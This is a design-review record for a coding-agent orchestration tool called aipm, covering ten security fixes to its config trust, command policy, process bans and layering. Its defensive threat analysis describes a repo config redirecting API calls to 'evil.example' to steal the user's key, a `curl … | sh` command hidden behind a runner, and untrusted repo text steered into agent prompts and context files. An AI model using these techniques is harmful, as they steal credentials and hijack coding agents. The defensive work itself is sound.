# Design review 01: ARCHITECTURE.md and SECURITY.md

| | |
|---|---|
| Step | Build prompt 01, Part A (design review before scaffolding) |
| Date | 2026-10-28 |
| Documents reviewed | [ARCHITECTURE.md](../ARCHITECTURE.md), [SECURITY.md](../SECURITY.md), [AGENTS.md](../../../AGENTS.md) (design v1.0, commit `a89eae8`) |
| Outcome | All proposals accepted by the owner, with the conditions recorded in [§6](#6-owner-decisions). The two items that change a SECURITY.md control ([§4](#4-control-impact-check)) were approved separately on 2026-10-28. Applied in the commit `docs: apply design review 01`; notes from applying are in [§8](#8-notes-from-applying-the-fixes). |

This file records the review, the fixes, the deferred scope and the owner's decisions. The doc changes themselves land in one `docs:` commit, after the owner has seen a diff summary.

---

## 1. Issues and fixes

Ordered by severity. "Docs to change" lists every place the `docs:` commit must touch, so the change can be checked line by line.

### Issue 1: a cloned repo's `.pm/config.yaml` can steal the user's API key (critical)

- **Where:** ARCHITECTURE §15 ("Security keys cannot be relaxed from the repo"); SECURITY §6 rule 5.
- **Problem:** Tighten-only protection covers only `security.*`, `dispatch.sandbox` and `dispatch.tools.*.bare`. Every other key in the tracked `.pm/config.yaml` is honoured as written, and LLM calls do not require execution trust. A malicious repo can set `llm.provider: openai-compatible`, `llm.base_url: https://evil.example/v1` and `llm.api_key_env: ANTHROPIC_API_KEY`. The first `aipm discover` then sends the user's key (in the `Authorization` header) and the repo content to the attacker. This breaks SG-3 and SG-6. Other keys with the same problem:
  - `dispatch.tools.*.pass_env` hands arbitrary environment variables to the agent;
  - `budget.*` can be raised without limit, and `llm.pricing` set to 0 disables USD budget accounting;
  - `context.allowed_url_domains` re-enables exfiltration links in generated context files;
  - `dispatch.tools.claude.allow_auto_mode` (SECURITY §9.3 already says user-level only, but nothing enforces it).
- **Fix:** Every config field carries one of three classes in the schema (field metadata), and the loader enforces them:
  - **user-only** (a repo value is ignored, with a warning): `llm.provider`, `llm.base_url`, `llm.api_key_env`, `llm.pricing`, `dispatch.tools.*.pass_env`, `dispatch.tools.*.allow_auto_mode`, `security.extra_allowed_executables`;
  - **tighten-only** (the repo value can only make the setting stricter): `security.*`, `dispatch.sandbox`, `dispatch.tools.*.bare`, `dispatch.parallel`, `dispatch.max_retries`, `dispatch.task_timeout`, `budget.*` (minimum wins), `context.allowed_url_domains` (intersection);
  - **repo-ok:** everything else.
- **Tests:** new invariant **I-8** in SECURITY §14.1 ("a repo-level config cannot set a user-only key or relax a tighten-only key"), plus a corpus case for the `base_url` redirect.
- **Docs to change:** ARCHITECTURE §15 (class table, annotated example); SECURITY §6 rule 5, §14.1.

### Issue 2: the command policy inspects only `argv[0]`, so runners bypass the hard-deny list (high)

- **Where:** SECURITY §10 rules 2–4.
- **Problem:** `["uv", "run", "bash", "-c", "curl … | sh"]` passes the policy as written: `uv` is an allowed executable, `bash` is not `argv[0]`, and the denied patterns include `uv run --with` but not `uv run bash` or `uv run python -c`. The same applies to `npm exec`, `pnpm dlx`, `yarn dlx` and `python -m pip`. The hard-deny list ("cannot be allowed by any configuration") is the backstop for a rubber-stamped `aipm trust` (R-2), so it has to hold.
- **Fix:** `allowed_executables` in each stack template becomes a list of **argv prefixes** (for example `["uv", "run", "--frozen", "--offline", "ruff"]`). An argv must start with one allowed prefix, or the policy rejects it. The resolved absolute path of `argv[0]` stays in the trust hash. The policy also rejects inline-code flags (`-c`, `-e`, `--eval`, `-p` for node) anywhere after a runner, and any hard-denied executable name at any argv position after a runner.
- **Tests:** property test: no hard-denied name and no inline-code flag appears after a runner in any argv that `compile_gate` returns.
- **Docs to change:** SECURITY §10 rules 2–4; ARCHITECTURE §13.1 (stack template example gains `allowed_executables`).

### Issue 3: the `subprocess` ban misses every other way to start a process (high)

- **Where:** ARCHITECTURE §5.1; SECURITY §10 rule 1; AGENTS.md rule 1.
- **Problem:** Banning `import subprocess` does not stop `asyncio.create_subprocess_exec` and `asyncio.create_subprocess_shell` (which `run_safe_async` itself needs, so they will exist in the codebase), `os.spawn*`, `os.exec*`, `os.posix_spawn*`, `os.fork`, `os.popen`, `pty`, `multiprocessing`, or a dynamic `importlib.import_module("subprocess")` / `__import__`. import-linter sees module imports only, not attribute calls such as `os.system`.
- **Fix:** A ruff `banned-api` (TID251) list covering all of the above, applied to `src/aipm/**`, with `src/aipm/execution/process.py` as the only exemption. `importlib.import_module` is allowed only in `src/aipm/plugins/loader.py`. The import-linter forbidden contract stays as a second layer.
- **Tests:** one ruff check per banned entry, run against a `src/aipm/...` path (via `--stdin-filename`), plus one proving the `process.py` exemption.
- **Docs to change:** ARCHITECTURE §5.1; SECURITY §10 rule 1; AGENTS.md rule 1.

### Issue 4: the T1 trust level rests on a file any repo can forge (high)

- **Where:** SECURITY §4 (T1 definition and taint rule) versus SECURITY §6 rule 6.
- **Problem:** T1 is "a `.pm/` artifact whose sha256 matches a recorded human approval", and approvals live in `approvals.yaml`, which §6 rule 6 says anyone with write access to the repo can forge. A cloned repo can ship `architecture.md` together with a matching `approvals.yaml`; the planner then receives attacker text as T1, outside the untrusted wrapping. Commits pulled from teammates have the same effect: their approval, not the current user's.
- **Fix:** Approvals drive the **phase** only (ARCHITECTURE §7.1). Every `.pm/` artifact rendered into an LLM prompt is always wrapped as `Untrusted`, with a source label such as `approved:prd`. T1 keeps its meaning for workflow ("may inform roles") but no longer means "rendered unwrapped".
- **Docs to change:** SECURITY §4 (T1 row and taint rule), §7.2; ARCHITECTURE §14.1 (role input trust levels); prompt 04 line 53.

### Issue 5: gate commands from untrusted config are written into AGENTS.md and task prompts (medium)

- **Where:** ARCHITECTURE §10.1 (`verify[]`), §10.2 (AGENTS.md "how to run checks"), §16 (`prompt` and `sync-context` need no trust).
- **Problem:** The gate menu lives in the tracked `.pm/config.yaml`. The command policy and trust are checked only before aipm executes a command. `prompt` and `sync-context` copy the argv into files that the user's own agent follows, and in manual mode (§12.7) that agent runs without aipm's sandbox. A malicious repo's `lint: ["bash", "-c", "…"]` is presented to the agent as "run this to check your work".
- **Fix:** Gate argv is rendered into prompts and context files only through `compile_gate` (policy-checked), and only when the execution surface is trusted. Otherwise the command exits 6 and prints the `aipm trust` hint. `trust` is already in v0.1, so no milestone moves.
- **Docs to change:** ARCHITECTURE §10.1, §10.2, §16 (`prompt`, `sync-context` notes); SECURITY §6 rule 3 (list of commands that need trust).

### Issue 6: much of `aipm.security` is not pure, so the L0 contract cannot be written as specified

- **Where:** ARCHITECTURE §5.1 ("L0 … MUST NOT import … file I/O helpers"), §5.2 (C-20, C-21), §5.3, §19; AGENTS.md layers and rule 10; prompt 02 line 54; prompt 06 line 49.
- **Problem:**
  - `security/trust_store.py` reads and writes `trust.json`.
  - `security/supply_chain.py` makes registry HTTP calls; prompt 06 calls it "the only module allowed network access besides the LLM gateway".
  - `security/paths.py` must resolve symlinks.
  - `security/redact.py` reads `os.environ`.
  - `security/command_policy.py` resolves executables with `shutil.which`.
  - `security/diff_checks.py` needs git and filesystem data.
- **Fix:**
  - Move `trust_store.py` to `aipm.state.trust_store` (L1).
  - Split the supply-chain code: name and ecosystem validation, typosquat distance and the age policy stay pure in `security/supply_chain.py`; the HTTP lookups move to `aipm.scanners.registry` (L1), which becomes the single network exception besides the LLM gateway.
  - `redact` takes an environment snapshot as a constructor argument. The redactors used by the LLM gateway, `StateStore` and logging are always built from the full `os.environ`, and a test asserts this.
  - `compile_gate` stays pure. Executable resolution with `shutil.which` happens in the trust store, at trust time.
  - `diff_checks` becomes a pure function over a `ChangeSet` model that `aipm.execution.git` builds.
  - `security/paths.py` is the one stated exception: it may make read-only `lstat`/`realpath` calls to detect symlink escapes.
  - L0 is restated as: no subprocess, no network, no file writes, no LLM SDKs; read-only path resolution only in `security/paths.py`.
- **Docs to change:** ARCHITECTURE §5.1, §5.2, §5.3 (`TrustStore` module path), §19; AGENTS.md layers and rule 10; prompt 02 line 54; prompt 06 line 49.

### Issue 7: some modules import upward or across siblings, and two packages have no layer

- **Where:** ARCHITECTURE §5.1–§5.3, §19; prompt 07 line 48.
- **Problem:**
  - `execution/dispatcher.py` and `execution/build_loop.py` sit in L1 but drive adapters and gates (L2). The `ToolAdapter` and `GateRunner` protocols are defined in L2 as well, so even their type hints break the layers contract.
  - `gates/builtin/ac_review.py` needs `roles.ac_reviewer`, an L2 sibling. The context generator and the adapters both produce context files.
  - `observability` and `plugins` are in the AGENTS.md layout but in no layer of §5.1.
  - `cli` "may import only `app`", yet it must map typed errors to exit codes and sanitize text before printing (AGENTS.md rule 8). The error types are raised in L0–L2, so they cannot live in `cli`.
- **Fix:**
  - Move `dispatcher.py` and `build_loop.py` into `aipm/app/`. Only `run`, `build` and `auto` use them.
  - Split L2 into L2b `gates | adapters | reporting` above L2a `roles | context`, so `gates → roles` and `adapters → context` are legal. Siblings inside a sub-layer stay independent.
  - Put `observability` and `plugins` in L1.
  - Add `aipm/domain/errors.py` (L0) with the `ExitCode` enum (§16.1) and an `AipmError` hierarchy carrying `exit_code`.
  - `cli` may import `aipm.app`, `aipm.domain.errors` and `aipm.security.sanitize`.
  - `cli/errors.py` keeps the JSON envelope (§16.2) and re-exports `ExitCode`. This is a small deviation from prompt 01, which puts the enum in `cli/errors.py`.
- **Docs to change:** ARCHITECTURE §5.1 (diagram and rules), §5.2 (C-18 package), §19; AGENTS.md layers; prompt 01 line 49; prompt 07 line 48.

### Issue 8: `ac_trace` cannot be built as specified

- **Where:** ARCHITECTURE §13.1 ("No other placeholders exist"), §13.3 (`ac_trace`); SECURITY §10 rule 5; SECURITY §9.1 (gates may write only the worktree and a temp dir).
- **Problem:** `ac_trace` reads the JUnit XML (pytest) or JSON reporter output (jest, vitest) of the `unit` run. The `unit` argv has no report flag, and §10 rule 5 allows no placeholder that could name a report path. Writing the report inside the worktree would let the agent plant a fake one in advance.
- **Fix:** Add one aipm-controlled placeholder, `{report_file}`:
  - its value is an absolute path in the per-attempt temp dir, outside the worktree, generated by aipm and never derived from task, LLM or config data;
  - the file is deleted immediately before the gate runs;
  - it is always its own argv element, for example `["…", "pytest", "-q", "--junitxml", "{report_file}", "{test_paths}"]`.
- **Limit:** this stops a report planted before the gate runs. It cannot stop agent-written test code (for example a `conftest.py`) that forges the report while the gate is running. That is the existing residual risk R-1/R-5, and the sandbox and human review of the integration branch still apply.
- **This changes a SECURITY.md control.** See [§4](#4-control-impact-check), item A.
- **Docs to change:** ARCHITECTURE §13.1 (placeholders, python-uv `unit` gate), §13.3; SECURITY §10 rule 5; prompt 02 lines 35 and 83.

### Issue 9: the config schema (§15) is missing keys the rest of the design relies on

- **Missing keys:**
  - `allowed_executables` (argv prefixes, Issue 2) and `test_roots` (for `{test_paths}`) in the stack template schema;
  - `security.extra_allowed_executables`, user-only (SECURITY §6 and §10.2 call it `extra_allowed`);
  - `dispatch.tools.<tool>.pass_env` (SECURITY §8) and `dispatch.tools.claude.allow_auto_mode` (SECURITY §9.3), both user-only;
  - a `scanners` key for "config-defined scanners" (SECURITY §6 rule 3) and "rule packs are pinned in config" (ARCHITECTURE §13.3).
- **Name clash:** `gates.fail_fast` (§13.2) collides with `gates:` already being the map of gate names, so `fail_fast` would read as a gate. Rename it to `dispatch.fail_fast` (repo-ok; failing fast never passes a task).
- **Docs to change:** ARCHITECTURE §13.1, §13.2, §13.3, §15; SECURITY §6 (rename `extra_allowed`), §8, §10 rule 2.

### Issue 10: the CLI spec and the data model omit things other sections require

- **Flags referenced elsewhere but missing from §16:**
  - `--accept-risk` (§5.4, SECURITY §7.9): on the commands that call the LLM (`discover`, `design`, `plan`, `verify` for `ac_review`, `auto`);
  - `--accept-stale` (§7.1): on the commands that consume downstream artifacts (`design`, `plan`, `prompt`, `verify`, `run`, `build`, `auto`);
  - `--trace` (§17): global, a v0.4 stub until then;
  - `--no-cache` (§14): arrives in v0.2 together with the cache (deferred item 4).
- **`--yes`** is both a global flag and a command flag (`approve --yes`, `auto --yes`). aipm accepts it in both positions with the same meaning.
- **Security events have no home.** `aipm status --ack EVENT-ID` is v0.1, but the journal exists only per build run. Add `.pm/events.jsonl` to §6.1: gitignored, append-only, written only through `StateStore`. Event IDs are random, so a file committed by a malicious repo cannot acknowledge future events in advance.
- **Docs to change:** ARCHITECTURE §6.1, §16; SECURITY §7.9.

## 2. Owner-directed change: no sampling parameters

The owner added this requirement in the decisions round:

- The LLM gateway MUST NOT send `temperature`, `top_p` or `top_k` to any provider. The owner states that Anthropic API version 2026-10-21 rejects them.
- **Docs to change:** ARCHITECTURE §14 (gateway rules; the cache rule "skipped for temperature > 0 unless `llm.cache_nondeterministic: true`" goes, and the cache's determinism rule is redefined when the cache returns in v0.2), §15 (remove `llm.temperature`; no `cache_nondeterministic` key).
- **Tests (prompt 03):** a gateway test asserts that no request, for either provider, contains these parameters.
- **To verify when applying:** the exact API behaviour and whether the gateway must pin an `anthropic-version` header, against the current Claude API documentation.
- **Verified on 2026-10-28** against the Claude API reference bundled with Claude Code (cached 2026-10-06):
  - API version `2026-10-21` exists; the previous version is `2023-06-01`.
  - On `2026-10-21`, a Messages request that sends `temperature`, `top_p` or `top_k` returns a 400 on every model, even at a default value such as `temperature: 1`. This also applies to each request in a Message Batch.
  - On the current models the parameters are already restricted on `2023-06-01`: Claude Opus 5.5 rejects them, and Claude Sonnet 5.5 and Claude Haiku 5.5 reject non-default values.
  - The Python SDK `anthropic` 2.0.0 is the first release that sends `2026-10-21` by default. The gateway therefore pins no `anthropic-version` header; it requires `anthropic>=2.0.0` and leaves the version to the SDK.
  - Migration guide: `https://platform.claude.com/docs/en/api/migration-2026-10-21`. Prompt 03 re-checks this before coding.

## 3. Deferred scope

The owner's condition: defer only if the item is not a v0.1 security control (L1–L6, trust store, command policy, redaction, process runner).

| # | Item | Moves to | Is it a v0.1 security control? | Result |
|---|---|---|---|---|
| D-1 | Stack templates `python-pip`, `node-npm`, `node-pnpm` | v0.2 (prompt 06, with the gate runner) | No. The command policy stays in v0.1 and is tested against `python-uv`. | Deferred |
| D-2 | Schema migration framework and `doctor --fix-schema` | The release that introduces the first v2 schema | No. Schema validation and "refuse a newer `schema_version`, exit 2" stay in v0.1. | Deferred |
| D-3 | Generated Claude subagents (`.claude/agents/aipm-*`) and skills (`.claude/skills/aipm-*`) | v0.2 (prompt 06) | No. `AGENTS.md` and `CLAUDE.md` carry the task protocol in v0.1, and the L1 sanitization of context files is unchanged. | Deferred |
| D-4 | LLM response cache (`.pm/cache/llm/`) and `--no-cache` | v0.2 (prompt 06) | No. Deferring it removes a store of untrusted model output. | Deferred |
| D-5 | Run `osv-scanner` only on aipm's own `uv.lock`; drop `pip-audit` | v0.1 (CI) | Not in the owner's list, but SECURITY §12.1 names both tools. | Approved 2026-10-28 ([§4](#4-control-impact-check), item B) |
| D-6 | OpenSSF Scorecard | v0.4, with the release pipeline | No. It appears only in ARCHITECTURE §21, not in SECURITY.md. | Deferred |

**Docs to change:** ARCHITECTURE §5.4 (`--fix-schema` hint), §6.2 (migrations), §10.2 (milestone column), §13.1 (stacks table), §14 (cache milestone), §16 (`doctor --fix-schema`), §21, §22 (v0.1 and v0.2 scope); prompt 02 lines 46 and 53; prompt 03 line 31; prompt 05 line 31; prompt 06 (gains D-1, D-3, D-4); prompt 01 line 66 if D-5 is approved.

## 4. Control-impact check

The owner's condition: no fix may weaken a control in SECURITY.md; any change that does is listed here for separate approval.

**Needed the owner's approval before the `docs:` commit. Both were approved on 2026-10-28.**

- **A. Third placeholder `{report_file}` (Issue 8). Approved.** SECURITY §10 rule 5 says only `{paths}` and `{test_paths}` exist. The new placeholder's value is generated by aipm, lives outside the worktree, is pre-deleted, and is never derived from task, LLM or config data. The alternatives are worse: an environment variable such as `PYTEST_ADDOPTS` is invisible in the trusted argv, and parsing test stdout trusts output the agent controls.
- **B. Drop `pip-audit`, keep `osv-scanner` (D-5). Approved.** SECURITY §12.1 names both. osv-scanner reads `uv.lock` directly and draws on the same advisory data (the PyPA advisory database through OSV); pip-audit would need a `uv export` step. If this is not approved, `security.yml` runs both.

**Moved without changing strength:**

- The single network exception besides the LLM gateway moves from `security/supply_chain.py` to `scanners/registry.py` (Issue 6). AGENTS.md rule 10 and prompt 06 are renamed accordingly. There is still exactly one exception.
- `redact` takes an environment snapshot instead of reading `os.environ` itself (Issue 6). A test asserts that the gateway, `StateStore` and logging redactors are built from the full environment.

**Architecture rules relaxed (not SECURITY.md controls; listed for visibility):**

- `security/paths.py` may make read-only `lstat`/`realpath` calls (Issue 6).
- `cli` may import `aipm.domain.errors` and `aipm.security.sanitize` in addition to `aipm.app` (Issue 7).
- L2 is split into two sub-layers, allowing `gates → roles` and `adapters → context` (Issue 7).

**Strengthened:** Issues 1, 2, 3, 4 and 5; Issue 9 (new keys are user-only or tighten-only where they matter); Issue 10 (random event IDs).

## 5. Third-party facts to verify

For coding-agent CLIs: run `<tool> --version` and `<tool> --help` on a pinned version, compare with the vendor's CLI reference, record the result in the README's tested-versions table, and encode it in the stub-binary contract tests. Capability detection (ARCHITECTURE §11) fails closed if a flag disappears later.

| Fact | Doubt | How and when to verify |
|---|---|---|
| `semgrep --config auto` together with `--metrics off` (ARCHITECTURE §13.3) | Fairly confident semgrep refuses `auto` when metrics are off; §13.3 also says rule packs are pinned | Run `semgrep --config auto --metrics off .`. Use explicit packs (for example `p/python`, `p/secrets`) regardless. Applied in the `docs:` commit; checked in prompt 01 (`security.yml`) and prompt 06. |
| Claude Code: `--bare`, `--permission-mode dontAsk`, `--permission-prompts none`, `--max-budget-usd`, `--append-system-prompt-file`, `CLAUDE_CONFIG_DIR`, the 10 MB stdin cap, `stream-json` needing `--verbose`, `result` event fields | `--permission-prompts none` is not recognised; also check whether a `Bash(<cmd> *)` rule rejects compound commands such as `pytest; curl …` | CLI help plus the Claude Code CLI reference. Prompts 05 and 07. |
| Codex: `exec -` reading stdin, `--json`, `-o`, the `--yolo` alias, `CODEX_HOME`, the 32 KiB instructions default | Moderate | CLI help plus the Codex docs. Prompt 08. |
| Copilot CLI: `--no-ask-user`, `--secret-env-vars`, `--attachment`, `--trust-folder`, `-s`, `shell(<cmd>)` patterns | Least certain of all the tool flags | CLI help plus the GitHub docs. Prompt 08. |
| Gemini CLI: `-p` versus a positional prompt; `--allowed-tools` syntax (`run_shell_command(...)` versus `ShellTool(...)`); `--output-format json` | Moderate | CLI help plus the Gemini CLI docs. Prompt 08. |
| `srt`: package name, per-invocation settings file, profile field names (`allowWrite`, `denyRead`, `denyWrite`, network allow-list), Linux prerequisites (bubblewrap, socat) | Moderate | Package README plus a local run. Prompt 06. |
| Typer: whether `import typer` eagerly imports Rich | Depends on the Typer version | `python -X importtime` on the console script, not through `uv run`. Prompt 01 (the startup-time test). |
| import-linter: forbidding stdlib modules (`subprocess`, `socket`) needs `include_external_packages = true`; the `\|` syntax for independent siblings | Moderate | A deliberately violating fixture module in a test. Prompt 01. |
| ruff: `banned-api` matching attributes such as `asyncio.create_subprocess_exec`; `--stdin-filename` honouring per-file ignores | Low | The ban test. Prompt 01. |
| pytest-socket: `--disable-socket` can break asyncio's `socketpair` self-pipe | Likely needs `--allow-unix-socket` for asyncio tests | Prompt 07 (first asyncio tests). |
| hatch-vcs needs full git history and tags in CI | Known | `fetch-depth: 0` on checkout. Prompt 01. |
| GitHub Action SHAs and versions; `actions/attest-build-provenance` versus `actions/attest`; the gitleaks action's licence requirement (organisation-owned repos only) | SHAs must never come from memory | Resolve each SHA with `gh api` at scaffold time. Prompts 01 and 08. |
| Sampling parameters rejected by Anthropic API version 2026-10-21 (§2 above) | Owner-provided | Claude API documentation, when applying the `docs:` commit. Prompt 03. |

## 6. Owner decisions

| Topic | Decision |
|---|---|
| Issues 1–10 | Apply in one `docs:` commit. Show the owner a diff summary first. No fix may weaken a SECURITY.md control; any that does is listed for approval ([§4](#4-control-impact-check)). |
| Sampling parameters | Added: the gateway never sends `temperature`, `top_p` or `top_k` ([§2](#2-owner-directed-change-no-sampling-parameters)). |
| Deferred items | Defer all six unless one is a v0.1 security control. None is; D-5 needs approval because it changes SECURITY §12.1 ([§3](#3-deferred-scope)). |
| Repo layout | Move the starter files from `aipm-starter/` to the repository root in its own commit, `chore: move starter files to repo root`, keeping history. Delete the committed `.DS_Store` files and add `.DS_Store` to `.gitignore`. |
| commit-msg hook | The owner enables it: `git config core.hooksPath .githooks` (agents may not run `git config`). Commits carry no AI attribution lines (AGENTS.md). |
| ruff subprocess ban | Applies to `src/aipm/**`; `tests/**` are exempt because their fixtures need `git` and the CLI as subprocesses before `run_safe` exists. |
| `commit-authorship` CI job | Compare each commit's GitHub `author.login` (from the compare API, `contents: read` only) with `github.repository_owner`; allow `dependabot[bot]`; fail commits whose author is not linked to a GitHub account. The owner confirms the commit email is verified on the `mlbala` account, so no email address appears in the workflow. |
| zizmor | Added to the `dev` dependency group with an exact version pin, so `uv run zizmor .github/` works locally. gitleaks and semgrep run in CI only. |
| Local tooling notes | uv here is 0.7.13 (June 2025); `uv self update` is suggested. uv will download a managed Python 3.12, because the local Python is 3.14. |
| §4 items A and B | Both approved on 2026-10-28. |
| `CODE_OF_CONDUCT.md` contact (Part B) | The `mlbala` GitHub account only, with no email address in the file. |

## 7. Order of work

1. This review record. It is committed together with the `docs:` commit. **Done.**
2. `chore: move starter files to repo root`. **Done** (`0e5dec7`).
3. New session, so the root `CLAUDE.md` and `.claude/settings.json` load. **Done.**
4. The owner approves or rejects [§4](#4-control-impact-check) items A and B. Then the diff summary, then the `docs:` commit (Issues 1–10, §2, §3). **Done:** A and B approved on 2026-10-28.
5. Part B (scaffold) of prompt 01, following these decisions.

## 8. Notes from applying the fixes

Clarifications made while editing, all within the accepted fixes:

- **Layer siblings (Issue 7).** The review made packages inside L2a and inside L2b independent. ARCHITECTURE §5.1 now also states that packages inside L0 (`domain`, `security`) and inside L1 may import each other: `compile_gate` takes `domain` models, and the config loader reads YAML through `state`. The import-linter layers contract is written that way.
- **`anthropic>=2.0.0` (§2).** ARCHITECTURE §14 and §19 record the SDK lower bound that makes the SDK send API version `2026-10-21`, instead of pinning the header in aipm.
- **`importlib.import_module` in `plugins/loader.py` (Issue 3).** A ruff per-file ignore would exempt every banned API in that file. Prompt 08 therefore uses a line-level `# noqa: TID251` on the one call, plus a test that no other `noqa: TID251` exists outside `execution/process.py`. Until prompt 08, `loader.py` has no exemption.
- **`--no-cache` (Issue 10, D-4).** Listed as a global flag in ARCHITECTURE §16, marked v0.2.
- **`--accept-stale` on `prompt` and `run`.** Added as listed in Issue 10. `prompt` and `sync-context` also need trust now (Issue 5); prompt 05's end-to-end flow runs `aipm trust --confirm` before `prompt`.
- **Scorecard (D-6).** Prompt 08 gains a `scorecard.yml` item.
- **ADR-0008 ("never push")** is about the aipm tool and is unchanged. The repository's own workflow (pushing step branches and opening PRs under the owner's name) is in AGENTS.md "Git".
